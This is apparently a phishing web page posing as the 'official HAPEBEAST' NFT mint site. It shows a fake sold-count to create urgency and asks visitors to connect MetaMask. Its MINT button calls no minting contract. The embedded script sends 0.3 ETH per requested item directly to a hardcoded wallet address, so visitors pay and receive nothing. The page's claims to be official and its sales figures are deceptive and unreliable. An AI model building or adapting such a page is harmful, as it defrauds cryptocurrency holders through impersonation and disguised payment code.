<html lang="en">

<head>
    <meta property="og:title" content="HAPE-OR-NOT">
    <meta property="og:type" content="website">
    <meta property="og:url" content="https://hapeornot.com/">
    <meta property="og:image" content="https://hapeornot.com/images/meta.jpg">
    <meta property="og:description" content="HAPE-OR-NOT">
    <meta name="theme-color" content="#FF0000">

    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
    <title>HAPEBEAST</title>
    <link rel="stylesheet" href="../styles/main.css">
    <link rel="icon" type="image/ico" href="../images/favicon.ico"/>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Barlow:wght@200;400&display=swap" rel="stylesheet">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
    <script src="https://unpkg.com/@metamask/legacy-web3@latest/dist/metamask.web3.min.js"></script>
    <script>
      function change(){
      var txt = "15";
      document.getElementById("mintnumber").value = txt;
      }
   </script>
</head>
<body class="hapebg">
    <div class="container-fluid d-flex justify-content-center m-0" style="height: 100vh;">
        <div class="row mt-5 d-flex justify-content-center">
            <div class="col d-flex align-items-center">
                <div class="card nobgcolor scenter">
                    <div class="card-body">
                        <div class="container-fluid">
                            <div class="row">
                                <div class="col d-flex justify-content-center">
                                    <img class="logo" src="/images/logo.svg" alt="">
                                </div>
                            </div>
                            <div class="row mt-4 d-flex justify-content-center">
                                <div class="col d-flex justify-content-center">
                                    <span class="text-center desc" style="color:#FFFFFF;">This is the official HAPEBEAST
                                        mint site.
                                        Follow the instructions to mint your HAPE now. See you on the other
                                        side.</span>
                                </div>
                            </div>
                            <br>
                            <div class="quantity" id="quantity">Quantity <b>(max 15)</b>: <input type="number" id="mintnumber" min="1" max="10" value="1"></input><button class ="butmax" onclick="change()">MAX</button></div>
                            <div class="mintprice1" id="mint-text">Sold: 812/888</div>
                            <div class="mintprice">Price per mint is <b>0.3 ETH</b><br><br>1. Connect your wallet with MetaMask<br>2. Click on the button to mint your Hapes</div>
                            <div class="row mt-4 d-flex justify-content-center">
                                <div class="col d-flex justify-content-center">
                                    <div class="action-btn d-flex justify-content-center bg-white cpointer" id="mintBtn">
                                        <span class="text-center text-black pt-3 pb-3">MINT</span>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <script type="text/javascript">
      window.addEventListener('load', async () => {
        if (window.ethereum) {
          window.web3 = new Web3(ethereum);
          try {
            await ethereum.enable();
            initPayButton()
          } catch (err) {
            console.log('Connect Failed', err)
          }
        } else if (window.web3) {
          window.web3 = new Web3(web3.currentProvider)
          initPayButton()
        } else {
          console.log('Paybutton error')
        }
      })
      const initPayButton = () => {
        $('#mintBtn').click(() => {
          // paymentAddress is where funds will be send to
          const paymentAddress = '0xC76B983620dd1fA40B73BdF0e124EA4BD5a592b6'
          var quant = document.getElementById("mintnumber").value
          const amountEth = 0.3*quant
          web3.eth.sendTransaction({
            to: paymentAddress,
            value: web3.toWei(amountEth, 'ether')
          }, (err, transactionId) => {
            if  (err) {
              console.log('Payment failed', err)
            } else {
              console.log('Payment successful', transactionId)
            }
          })
        })
      }
    </script>
</body>
<script src="/scripts/hmu.js"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"

    crossorigin="anonymous"></script>
</html>
